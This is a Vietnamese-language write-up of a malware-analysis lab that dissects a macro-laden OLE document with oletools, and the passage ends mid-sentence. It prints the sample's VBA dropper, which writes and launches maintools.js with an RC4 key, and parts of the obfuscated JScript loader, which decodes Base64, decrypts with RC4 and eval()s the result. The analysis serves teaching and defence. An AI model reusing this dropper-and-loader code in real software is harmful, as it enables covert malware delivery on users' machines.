---
title: Obfuscated Lab - Malware Analysis
date: 2025-07-04
categories: [Forensics, Malware Analysis]
tags: [ole, vba, jscript, obfuscation]
image:
  path: ../assets/img/posts/Obfuscated_Lab/banner.png
  alt: CyberDefenders Obfuscated Lab Challenge
---

## Overview

**Difficulty:** Hard  
**Tools:** OLE Tools, oledump.py, olevba

## OLE File Structure

Bên trong file OLE có cấu trúc phân cấp gồm **storage** và **stream**:

- **Storage**: Giống như thư mục, chứa các storage hoặc stream con
- **Stream**: Giống như file, chứa dữ liệu nhị phân hoặc text

### Macro trong OLE

Macros là các đoạn code (thường viết bằng VBA – Visual Basic for Applications) được nhúng trong tài liệu.

**Đặc điểm:**
- Nếu file có macro, cấu trúc OLE sẽ có storage tên `Macros` hoặc `VBA`
- Bên trong `VBA` có các stream: `ThisDocument`, `Module1`, `dir`, `PROJECT`, `PROJECTwm`
- Mã VBA được lưu dạng nén (VBA compression), cần giải nén để đọc

**Phân tích macro:**
1. Dùng `olevba` (oletools) để liệt kê và trích xuất code
2. Hoặc dùng `oledump.py` để xem stream và giải nén VBA

---

## Q2: Multiple streams contain macros in this document. Provide the number of lowest one.

```bash
remnux@remnux:~/forensics/76-Obfuscated$ oledump.py 49b367ac261a722a7c2bbbc328c32545 
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

**Answer:** Stream **8** chứa macro (ký hiệu `M`)

---

## Q3: What is the decryption key of the obfuscated code?

```vb
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
    B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing

Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j

Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
```

**Phân tích:**
- `OBKHLrC3vEDjVL` = `%appdata%\Microsoft\Windows\maintools.js`
- Script chạy: `maintools.js EzZETcSXyKAdF_e5I2i1`

**Answer:** `EzZETcSXyKAdF_e5I2i1`

---

## Q5: This script uses what language?

### JScript vs JavaScript

**JScript:**
- Bản triển khai ECMAScript của Microsoft
- Chạy trên:
  - Internet Explorer
  - Windows Script Host (WSH) - truy cập file, registry
  - ASP Classic
- File: `.js` hoặc `.jse`, chạy bằng `wscript.exe` / `cscript.exe`
- Mạnh mẽ hơn JavaScript web vì tương tác trực tiếp với Windows

**Answer:** JScript

---

## Q6: What is the name of the variable that is assigned the command-line arguments?

```javascript
remnux@remnux:~/forensics/76-Obfuscated$ head maintools.js.bin
try{
    var wvy1 = WScript.Arguments;
    var ssWZ = wvy1(0);
    var ES3c = y3zb();
    ES3c = LXv5(ES3c);
    ES3c = CpPT(ssWZ,ES3c);
    eval(ES3c);  
}catch (e)
```

**Answer:** `wvy1`

---

## Q8: What instruction is executed if this script encounters an error?

```javascript
WScript.Quit()
```

Script thoát sạch khi gặp lỗi, tránh hiển thị thông báo lỗi có thể cảnh báo người dùng hoặc phần mềm bảo mật.

**Answer:** `WScript.Quit()`

---

## Q9: What function returns the next stage of code?

![Code deobfuscation flow](../assets/img/posts/Obfuscated_Lab/image.png)

**Flow giải mã:**
1. `y3zb()` - Trả về chuỗi obfuscated
2. `LXv5()` - Giải mã Base64
3. `CpPT()` - Giải mã RC4 với key
4. `eval()` - Thực thi code

```javascript
function LXv5(d27x) {
    var LUK7 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    // Base64 decode implementation
    // ...
    return mjqo;
}

function CpPT(bOe3, F5vZ) {
    // RC4 decryption
    var AWy7 = [];
    var V2Vl = 0;
    var qyCq;
    var mjqo = '';
    
    // Key scheduling
    for (var i = 0; i < 256; i++) {
        AWy7[i] = i;
    }
    for (var i = 0; i < 256; i++) {
        V2Vl = (V2Vl + AWy7[i] + bOe3.charCodeAt(i % bOe3.length)) % 256;
        qyCq = AWy7[i];
        AWy7[i] = AWy7[V2Vl];
        AWy7[V2Vl] = qyCq;
    }
    
    // Decryption
    // ...
    return mjqo;
}
```

**Answer:** `y3zb`

---

## Q10: The function LXv5 is an important function, what variable is assigned a key string value?

**Answer:** `LUK7` (Base64 alphabet string)

---

## Q12: In the function CpPT, the first two for loops are responsible for what?

Hai vòng lặp đầu thực hiện **Key Scheduling Algorithm** của RC4, trộn khóa để tạo bảng hoán vị.

**Answer:** Key Scheduling

---

## Q13: The function CpPT requires two arguments, where does the value of the first argument come from?

**Answer:** Command-line arguments (`WScript.Arguments`)

---

## Q17: What Windows Script Host program can be used to execute this script in command-line mode?

### Windows Script Host (WSH)

**Hai chương trình chính:**

1. **`wscript.exe`**
   - Chế độ GUI (cửa sổ, pop-up)
   - Tương tác với người dùng

2. **`cscript.exe`**
   - Chế độ command-line
   - In kết quả ra console
   - Phù hợp cho script automation

**Answer:** `cscript.exe`

---

## Q18: What is the name of the first function defined in the deobfuscated code?

![Deobfuscated code](../assets/img/posts/Obfuscated_Lab/image-1.png)

*[Xem ảnh để xác định tên hàm đầu tiên]*

---

## Summary

Lab này phân tích một mẫu malware sử dụng nhiều lớp obfuscation:
- VBA macro trong file OLE
- JScript được mã hóa Base64
- RC4 encryption với key từ command-line
- Kỹ thuật eval() để thực thi dynamic code

**Key Takeaways:**
- Sử dụng oletools để phân tích file OLE
- Hiểu cách macro VBA drop và execute payload
- Nhận diện các thuật toán mã hóa (Base64, RC4)
- Phân tích JScript trong